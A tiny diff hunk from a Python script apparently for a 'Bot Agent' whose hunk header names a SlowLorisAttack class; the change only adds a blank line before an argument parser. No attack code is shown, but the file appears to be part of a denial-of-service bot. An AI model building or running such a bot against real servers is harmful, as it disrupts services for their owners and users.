@@ -283,6 +283,7 @@ class SlowLorisAttack(threading.Thread):
 
 ''' End of referenced code '''
 
+
 if __name__ == "__main__":
 	parser = argparse.ArgumentParser(description = 'Bot Agent')
 	parser.add_argument('-a', metavar='HOST_ADDRESS', type=str, default='', help='Interface the server listens at')
